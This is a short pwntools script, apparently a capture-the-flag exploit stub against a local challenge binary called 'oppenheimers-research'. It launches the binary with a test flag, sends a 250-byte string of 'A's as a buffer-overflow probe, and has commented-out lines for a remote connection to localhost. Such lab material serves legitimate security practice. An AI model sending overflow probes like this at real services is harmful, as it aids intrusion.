import pwn

p = pwn.process(["./static/oppenheimers-research", "password", "MINUTEMAN{test-flag}"])
# host = "localhost"
# port = 4444
# p = remote(host, port)

p.sendline(b'A' * 250)
p.interactive()